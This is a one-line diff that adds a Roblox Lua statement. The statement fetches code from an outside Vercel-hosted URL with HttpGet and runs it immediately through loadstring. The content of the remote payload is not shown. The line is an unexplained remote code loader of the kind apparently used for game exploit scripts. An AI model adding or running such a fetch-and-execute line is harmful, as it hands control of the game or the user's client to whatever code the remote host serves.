@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api9-lake.vercel.app/api"))()
